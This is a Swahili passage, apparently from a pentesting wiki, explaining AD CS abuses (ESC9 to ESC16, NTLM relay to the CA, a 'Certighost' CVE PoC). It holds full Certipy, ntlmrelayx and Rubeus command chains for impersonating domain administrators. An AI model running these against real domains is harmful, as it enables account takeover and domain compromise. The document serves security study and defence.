rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Matumizi mabaya kwa [Certipy](https://github.com/ly4k/Certipy)

Ombi la certificate hufanywa na Certipy kwa chaguo-msingi kwa kutumia template `Machine` au `User`, kulingana na ikiwa jina la account linalofanyiwa relay linaishia na `$`. Kuweka template mbadala kunawezekana kwa kutumia parameter `-template`.

Technique kama [PetitPotam](https://github.com/ly4k/PetitPotam) inaweza kutumiwa kulazimisha authentication. Unaposhughulika na domain controllers, ni lazima kubainisha `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Maelezo

Thamani mpya **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) ya **`msPKI-Enrollment-Flag`**, inayojulikana kama ESC9, huzuia kuingizwa kwa **new `szOID_NTDS_CA_SECURITY_EXT` security extension** kwenye certificate. Flag hii huwa muhimu wakati `StrongCertificateBindingEnforcement` imewekwa kuwa `1` (setting ya default), tofauti na setting ya `2`. Umuhimu wake huongezeka katika hali ambapo certificate mapping dhaifu kwa Kerberos au Schannel inaweza kutumiwa (kama ilivyo katika ESC10), kwa sababu kutokuwepo kwa ESC9 hakutabadilisha requirements.<sup>[[7]](#references)</sup>

Masharti ambayo hufanya setting ya flag hii kuwa muhimu ni pamoja na:

- `StrongCertificateBindingEnforcement` haijawekwa kuwa `2` (default ikiwa `1`), au `CertificateMappingMethods` inajumuisha `UPN` flag.
- Certificate imewekewa `CT_FLAG_NO_SECURITY_EXTENSION` flag ndani ya setting ya `msPKI-Enrollment-Flag`.
- Client authentication EKU yoyote imeainishwa na certificate.
- Ruhusa za `GenericWrite` zinapatikana kwenye account yoyote ili ku-compromise nyingine.

### Abuse Scenario

Tuseme `John@corp.local` ana ruhusa za `GenericWrite` juu ya `Jane@corp.local`, akiwa na lengo la ku-compromise `Administrator@corp.local`. Template ya certificate ya `ESC9`, ambayo `Jane@corp.local` ameruhusiwa ku-enroll, imesanidiwa ikiwa na `CT_FLAG_NO_SECURITY_EXTENSION` flag kwenye setting yake ya `msPKI-Enrollment-Flag`.

Mwanzoni, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, kutokana na `John` kuwa na `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Baadaye, `userPrincipalName` ya `Jane` inabadilishwa kuwa `Administrator`, huku sehemu ya domain ya `@corp.local` ikiachwa kimakusudi:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Marekebisho haya hayakiuki masharti, kwa kuwa `Administrator@corp.local` inabaki tofauti kama `userPrincipalName` ya `Administrator`.

Baada ya hayo, template ya certificate ya `ESC9`, iliyoashiriwa kuwa vulnerable, inaombwa kama `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Imebainika kuwa `userPrincipalName` ya certificate inaonyesha `Administrator`, bila “object SID” yoyote.

`userPrincipalName` ya `Jane` kisha inarejeshwa kuwa ya awali, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kujaribu authentication kwa kutumia certificate iliyotolewa sasa kunatoa NT hash ya `Administrator@corp.local`. Amri lazima ijumuishwe `-domain <domain>` kwa sababu certificate haina maelezo ya domain:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Ulinganifu Dhaifu wa Certificate - ESC10

### Maelezo

Thamani mbili za registry key kwenye domain controller zinarejelewa na ESC10:

- Thamani ya default ya `CertificateMappingMethods` chini ya `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ni `0x18` (`0x8 | 0x10`), hapo awali ikiwa `0x1F`.
- Mpangilio wa default wa `StrongCertificateBindingEnforcement` chini ya `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ni `1`, hapo awali ikiwa `0`.<sup>[[7]](#references)</sup>

**Case 1**

Wakati `StrongCertificateBindingEnforcement` imesanidiwa kuwa `0`.

**Case 2**

Ikiwa `CertificateMappingMethods` inajumuisha bit ya `UPN` (`0x4`).

### Abuse Case 1

`StrongCertificateBindingEnforcement` ikiwa imesanidiwa kuwa `0`, akaunti A yenye ruhusa za `GenericWrite` inaweza kutumiwa vibaya ili ku-compromise akaunti yoyote B.

Kwa mfano, akiwa na ruhusa za `GenericWrite` juu ya `Jane@corp.local`, attacker analenga ku-compromise `Administrator@corp.local`. Utaratibu huu unafanana na ESC9, na kuruhusu certificate template yoyote kutumiwa.

Kwanza, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, kwa kutumia vibaya `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Baadaye, `userPrincipalName` ya `Jane` inabadilishwa kuwa `Administrator`, huku sehemu ya `@corp.local` ikiachwa kwa makusudi ili kuepuka ukiukaji wa kizuizi.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Kufuatia hili, certificate inayowezesha client authentication inaombwa kama `Jane`, kwa kutumia template chaguomsingi ya `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` kisha inarejeshwa kuwa ya awali, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kuthibitisha utambulisho kwa kutumia certificate iliyopatikana kutatoa NT hash ya `Administrator@corp.local`, hivyo ni lazima kubainisha domain kwenye command kwa sababu certificate haina maelezo ya domain.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kesi ya Matumizi Mabaya 2

Ikiwa `CertificateMappingMethods` ina bit flag ya `UPN` (`0x4`), akaunti A yenye ruhusa za `GenericWrite` inaweza ku-compromise akaunti yoyote B isiyo na property ya `userPrincipalName`, ikijumuisha machine accounts na built-in domain administrator `Administrator`.

Hapa, lengo ni ku-compromise `DC$@corp.local`, tukianza kwa kupata hash ya `Jane` kupitia Shadow Credentials, kwa kutumia `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` ya `Jane` huwekwa kuwa `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Cheti cha uthibitishaji wa mteja kinaombwa kama `Jane` kwa kutumia templeti chaguomsingi ya `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` inarejeshwa kuwa ya awali baada ya mchakato huu.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Ili kufanya authentication kupitia Schannel, chaguo la Certipy `-ldap-shell` linatumika, likionyesha kuwa authentication imefaulu kama `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kupitia LDAP shell, amri kama `set_rbcd` huwezesha mashambulizi ya Resource-Based Constrained Delegation (RBCD), ambayo yanaweza kuhatarisha domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Udhaifu huu pia unaenea kwa akaunti yoyote ya mtumiaji isiyo na `userPrincipalName`, au ambayo hailingani na `sAMAccountName`; `Administrator@corp.local` ya kawaida ni shabaha kuu kutokana na LDAP privileges zake za juu na kutokuwa na `userPrincipalName` kwa default.

## Relaying NTLM to ICPR - ESC11

### Maelezo

Ikiwa CA Server haijasanidiwa na `IF_ENFORCEENCRYPTICERTREQUEST`, inaweza kuwezesha NTLM relay attacks bila signing kupitia RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Unaweza kutumia `certipy` ku-enumerate ikiwa `Enforce Encryption for Requests` imezimwa, na certipy itaonyesha `ESC11` Vulnerabilities.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenario ya Abuse

Inahitajika kusanidi relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Kumbuka: Kwa domain controllers, lazima tubainishe `-template` katika DomainController.

Au kwa kutumia fork ya impacket ya sploutchy:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Administrators wanaweza kusanidi Certificate Authority ili kuihifadhi kwenye kifaa cha nje kama vile "Yubico YubiHSM2".

Ikiwa kifaa cha USB kimeunganishwa kwenye CA server kupitia porti ya USB, au kupitia USB device server endapo CA server ni virtual machine, authentication key (ambayo wakati mwingine huitwa "password") inahitajika ili Key Storage Provider itengeneze na kutumia keys katika YubiHSM.

Key/password hii imehifadhiwa kwenye registry chini ya `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` kwa maandishi wazi.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Abuse Scenario

Ikiwa private key ya CA imehifadhiwa kwenye kifaa halisi cha USB unapopata shell access, inawezekana kurecover key.

Kwanza, unahitaji kupata certificate ya CA (hii ni public), kisha:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Hatimaye, tumia amri ya `certutil -sign` kuunda certificate mpya ya kiholela kwa kutumia certificate ya CA pamoja na private key yake.

## OID Group Link Abuse - ESC13

### Maelezo

Attribute ya `msPKI-Certificate-Policy` huruhusu issuance policy kuongezwa kwenye certificate template. Objects za `msPKI-Enterprise-Oid` zinazohusika na kutoa policies zinaweza kugunduliwa katika Configuration Naming Context (`CN=OID,CN=Public Key Services,CN=Services`) ya PKI OID container. Policy inaweza kuunganishwa na AD group kwa kutumia attribute ya `msDS-OIDToGroupLink` ya object hii, na hivyo kuwezesha mfumo kumuidhinisha user anayewasilisha certificate kana kwamba ni member wa group hiyo. [Reference hapa](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Kwa maneno mengine, wakati user ana permission ya ku-enroll certificate na certificate imeunganishwa na OID group, user anaweza kurithi privileges za group hiyo.

Tumia [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kutafuta OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenario ya Abuse

Tafuta permission ya user; inaweza kutumia `certipy find` au `Certify.exe find /showAllPermissions`.

Ikiwa `John` ana permission ya ku-enroll katika `VulnerableTemplate`, user huyo anaweza kurithi privileges za group la `VulnerableGroup`.

Anachohitaji kufanya ni kubainisha template; atapata certificate yenye rights za OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configuration Hatarishi ya Uhuishaji wa Certificate - ESC14

### Maelezo

Maelezo kwenye https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ni ya kina sana. Hapa chini kuna nukuu ya maandishi ya awali.<sup>[[14]](#references)</sup>

ESC14 inahusu vulnerabilities zinazotokana na "weak explicit certificate mapping", hasa kupitia matumizi mabaya au configuration isiyo salama ya attribute ya `altSecurityIdentities` kwenye akaunti za mtumiaji au computer za Active Directory. Attribute hii yenye thamani nyingi inaruhusu administrators kuhusisha manually certificates za X.509 na akaunti ya AD kwa madhumuni ya authentication. Ikiwa imejazwa, mappings hizi explicit zinaweza kubatilisha certificate mapping logic ya kawaida, ambayo kwa kawaida hutegemea UPNs au DNS names kwenye SAN ya certificate, au SID iliyowekwa ndani ya security extension ya `szOID_NTDS_CA_SECURITY_EXT`.

Mapping "dhaifu" hutokea pale string value inayotumika ndani ya attribute ya `altSecurityIdentities` kumtambua certificate inapokuwa pana mno, rahisi kukisiwa, inategemea certificate fields zisizo unique, au inatumia certificate components zinazoweza ku-spoof kwa urahisi. Ikiwa attacker anaweza kupata au kutengeneza certificate ambayo attributes zake zinaendana na explicit mapping dhaifu iliyowekwa kwa akaunti yenye privileges, anaweza kutumia certificate hiyo ku-authenticate kama akaunti hiyo na kuifanya impersonation.

Mifano ya `altSecurityIdentities` mapping strings zinazoweza kuwa dhaifu ni pamoja na:

- Mapping inayotegemea Common Name (CN) ya Subject pekee: kwa mfano, `X509:<S>CN=SomeUser`. Attacker anaweza kupata certificate yenye CN hii kutoka kwenye source isiyo salama zaidi.
- Kutumia Issuer Distinguished Names (DNs) au Subject DNs za jumla mno bila qualification zaidi kama serial number maalum au subject key identifier: kwa mfano, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Kutumia patterns nyingine zinazotabirika au identifiers zisizo za cryptographic ambazo attacker anaweza kuzitimiza kwenye certificate anayoweza kuipata kihalali au ku-forge (ikiwa amechukua control ya CA au amepata vulnerable template kama ilivyo kwenye ESC1).

Attribute ya `altSecurityIdentities` inasaidia formats mbalimbali za mapping, kama vile:

- `X509:<I>IssuerDN<S>SubjectDN` (maps kwa kutumia Issuer na Subject DN kamili)
- `X509:<SKI>SubjectKeyIdentifier` (maps kwa kutumia value ya Subject Key Identifier extension ya certificate)
- `X509:<SR>SerialNumberBackedByIssuerDN` (maps kwa kutumia serial number, ambayo kwa njia isiyo ya moja kwa moja inahusishwa na Issuer DN) - hii si standard format, kwa kawaida huwa `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (maps kwa kutumia RFC822 name, kwa kawaida email address, kutoka kwenye SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (maps kwa kutumia SHA1 hash ya raw public key ya certificate - kwa ujumla ni strong)

Usalama wa mappings hizi unategemea sana specificity, uniqueness, na cryptographic strength ya certificate identifiers zilizochaguliwa na kutumika kwenye mapping string. Hata ikiwa strong certificate binding modes zimewezeshwa kwenye Domain Controllers (ambazo huathiri hasa implicit mappings zinazotegemea SAN UPNs/DNS na SID extension), entry ya `altSecurityIdentities` iliyowekwa vibaya bado inaweza kutoa njia ya moja kwa moja ya impersonation ikiwa mapping logic yenyewe ina kasoro au inaruhusu mambo mengi kupita kiasi.
### Abuse Scenario

ESC14 inalenga **explicit certificate mappings** kwenye Active Directory (AD), hasa attribute ya `altSecurityIdentities`. Ikiwa attribute hii imewekwa (kwa design au kutokana na misconfiguration), attackers wanaweza ku-impersonate akaunti kwa kuwasilisha certificates zinazolingana na mapping.

#### Scenario A: Attacker Anaweza Kuandika kwenye `altSecurityIdentities`

**Precondition**: Attacker ana write permissions kwenye attribute ya `altSecurityIdentities` ya akaunti inayolengwa au ana permission ya kuipatia account hiyo kupitia mojawapo ya permissions zifuatazo kwenye target AD object:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Target Ina Weak Mapping kupitia X509RFC822 (Email)

- **Precondition**: Target ina weak X509RFC822 mapping kwenye altSecurityIdentities. Attacker anaweza kuweka attribute ya mail ya victim ilingane na X509RFC822 name ya target, ku-enroll certificate kama victim, na kuitumia ku-authenticate kama target.
#### Scenario C: Target Ina X509IssuerSubject Mapping

- **Precondition**: Target ina weak X509IssuerSubject explicit mapping kwenye `altSecurityIdentities`.Attacker anaweza kuweka attribute ya `cn` au `dNSHostName` kwenye victim principal ilingane na subject ya X509IssuerSubject mapping ya target. Kisha, attacker anaweza ku-enroll certificate kama victim na kutumia certificate hiyo ku-authenticate kama target.
#### Scenario D: Target Ina X509SubjectOnly Mapping

- **Precondition**: Target ina weak X509SubjectOnly explicit mapping kwenye `altSecurityIdentities`. Attacker anaweza kuweka attribute ya `cn` au `dNSHostName` kwenye victim principal ilingane na subject ya X509SubjectOnly mapping ya target. Kisha, attacker anaweza ku-enroll certificate kama victim na kutumia certificate hiyo ku-authenticate kama target.
### concrete operations
#### Scenario A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Hifadhi na ubadilishe cheti
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Thibitisha utambulisho (kwa kutumia certificate)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Usafishaji (hiari)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Kwa mbinu mahususi zaidi za attack katika hali mbalimbali za attack, tafadhali rejelea: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Maelezo

Maelezo yaliyo kwenye https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc ni ya kina sana. Hapa chini kuna nukuu kutoka kwenye maandishi ya awali.<sup>[[15]](#references)</sup>

Kwa kutumia certificate templates za built-in default version 1, mshambuliaji anaweza kutengeneza CSR ili kujumuisha application policies ambazo hupendelewa kuliko attributes za Extended Key Usage zilizosanidiwa kwenye template. Sharti pekee ni kuwa na enrollment rights, na inaweza kutumika kutengeneza client authentication, certificate request agent, na codesigning certificates kwa kutumia template ya **_WebServer_**

### Abuse

Yafuatayo yameelekezwa kwenye [kiungo hiki]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Bofya ili kuona mbinu za matumizi zenye maelezo zaidi.<sup>[[14]](#references)</sup>


Amri ya `find` ya Certipy inaweza kusaidia kutambua V1 templates ambazo huenda ziko katika hatari ya ESC15 ikiwa CA haijafanyiwa patch.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Impersonation ya moja kwa moja kupitia Schannel

**Hatua ya 1: Omba certificate, ukiingiza Application Policy ya "Client Authentication" na UPN lengwa.** Attacker `attacker@corp.local` analenga `administrator@corp.local` akitumia template ya "WebServer" V1 (inayomruhusu enrollee kutoa subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Template ya V1 iliyo hatarini yenye "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Inaingiza OID `1.3.6.1.5.5.7.3.2` kwenye extension ya Application Policies ya CSR.
- `-upn 'administrator@corp.local'`: Inaweka UPN kwenye SAN kwa ajili ya impersonation.

**Hatua ya 2: Authenticate kupitia Schannel (LDAPS) kwa kutumia certificate iliyopatikana.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Hatua ya 1: Omba certificate kutoka kwa V1 template (iliyo na "Enrollee supplies subject"), ukiingiza Application Policy ya "Certificate Request Agent".** Certificate hii ni ya attacker (`attacker@corp.local`) ili awe enrollment agent. Hakuna UPN iliyobainishwa kwa utambulisho wa attacker mwenyewe hapa, kwa kuwa lengo ni kupata uwezo wa agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Huongeza OID `1.3.6.1.4.1.311.20.2.1`.

**Hatua ya 2: Tumia certificate ya "agent" kuomba certificate kwa niaba ya mtumiaji lengwa mwenye mamlaka.** Hii ni hatua inayofanana na ESC3, ikitumia certificate ya Hatua ya 1 kama certificate ya agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Hatua ya 3: Thibitisha utambulisho kama mtumiaji mwenye marupurupu kwa kutumia cheti cha "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Imezimwa kwenye CA (Global)-ESC16

### Maelezo

**ESC16 (Elevation of Privilege kupitia Missing szOID_NTDS_CA_SECURITY_EXT Extension)** inarejelea hali ambapo, ikiwa usanidi wa AD CS haulazimishi kujumuishwa kwa **szOID_NTDS_CA_SECURITY_EXT** extension katika certificates zote, mshambulizi anaweza kutumia mwanya huu kwa:

1. Kuomba certificate **bila SID binding**.

2. Kutumia certificate hii **kwa authentication kama account yoyote**, kama vile kujifanya account yenye privileges za juu (kwa mfano, Domain Administrator).

Unaweza pia kurejelea article hii ili kujifunza zaidi kuhusu kanuni hiyo kwa undani:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

Ifuatayo imerejelewa kwenye [link hii](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Bonyeza ili kuona mbinu za matumizi zenye maelezo zaidi.<sup>[[14]](#references)</sup>

Ili kubaini kama mazingira ya Active Directory Certificate Services (AD CS) yako vulnerable kwa **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Hatua ya 1: Soma UPN ya awali ya akaunti ya mwathiriwa (Si lazima - kwa urejeshaji).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Hatua ya 2: Sasisha UPN ya akaunti ya mwathiriwa iwe `sAMAccountName` ya msimamizi lengwa.
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Hatua ya 3: (Ikiwa inahitajika) Pata credentials za akaunti ya "victim" (k.m., kupitia Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Hatua ya 4: Omba certificate kama mtumiaji wa "victim" kutoka kwa _template yoyote inayofaa ya client authentication_ (kwa mfano, "User") kwenye CA iliyo katika hatari ya ESC16.** Kwa sababu CA iko katika hatari ya ESC16, itaondoa kiotomatiki SID security extension kutoka kwenye certificate iliyotolewa, bila kujali mipangilio mahususi ya template ya extension hii. Weka environment variable ya Kerberos credential cache (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Kisha omba cheti:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Hatua ya 5: Rejesha UPN ya akaunti ya "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Hatua ya 6: Thibitisha utambulisho kama msimamizi lengwa.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Maelezo

**Certighost** hutumia vibaya **AD CS enrollment chase / callback path** ambapo CA huamini request attributes zinazotolewa na requester ili kutambua identity inayopaswa kuwekwa kwenye certificate iliyotolewa. Kwenye public PoC, request iliyoundwa kwa makusudi inajumuisha:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP inayodhibitiwa na attacker ambayo CA itawasiliana nayo
- **`rmd`**: **target Domain Controller DNS name** ya kuigiza

Ikiwa CA itafuata chase hiyo, itaunganishwa na attacker kupitia **SMB/LSA (`445`)** na **LDAP (`389`)**. Attacker hutumia **real machine account** (ambayo kwa kawaida huundwa kupitia **`ms-DS-MachineAccountQuota`** ya default) ili callback session ithibitishe kama domain principal halali, lakini rogue services hurudisha identity attributes za **target DC** badala yake:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Ikiwa CA **haifungi returned identity cryptographically na authenticated callback principal**, inaweza kutoa certificate ya **Domain Controller** ingawa session ilithibitishwa kama machine account inayodhibitiwa na attacker. Hii hufanya bug hii iwe tofauti kimawazo na **Certifried**: badala ya kuandika upya AD attributes kama vile `dNSHostName`, attacker **hubadilisha identity data wakati wa CA callback resolution**.<sup>[[2]](#references)</sup>

**Masharti muhimu ya awali:**

- **domain credentials** zenye privileges ndogo
- Uwezo wa **kuunda au kutumia tena computer account**
- Network reachability kutoka kwa **CA** hadi **ports `389` na `445`** zinazodhibitiwa na attacker
- CA request path iliyo hatarini / ambayo haijapatchiwa (update ya Microsoft ya **July 14, 2026** iliongeza **DC validation kwa `cdc`** pamoja na **resolved-SID comparison**)

`.pfx` inayopatikana inaweza kutumiwa kwa **PKINIT**, na hivyo kutengeneza **`.ccache`** na, katika published PoC flow, **target DC NT hash**, ambayo kwa kawaida inatosha kwa **full domain compromise**.

### Matumizi mabaya

Public PoC hu-automate chain nzima:<sup>[[1]](#references)</sup>

1. Unda au tumia tena **machine account** inayodhibitiwa na attacker.
2. Anzisha **rogue LDAP na SMB/LSA listeners** kwenye `389` na `445`.
3. Tuma certificate request yenye attributes za **`cdc`** zinazodhibitiwa na attacker na **`rmd`** ya target.
4. Ruhusu CA ithibitishe kwa rogue listeners kama machine account inayodhibitiwa, lakini jibu identity lookups kwa attributes za **target DC**.
5. Pokea **DC certificate** iliyosainiwa na CA, kisha uitumie kwa **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Bendera muhimu za runtime kutoka kwenye PoC:

- `--listener <ip>`: chagua kwa uwazi IP ya callback inayotangazwa kwenye `cdc`
- `--computer-name <NAME$>`: tumia tena machine account iliyopo badala ya kuunda mpya

**Maelezo ya kiutendaji:**

- PoC inahitaji **root** kwa sababu inafunga **privileged ports** `389` na `445`.
- Exploitation iliyofanikiwa huandika **DC `.pfx`** na **Kerberos `.ccache`** kwenye mfumo wa ndani.
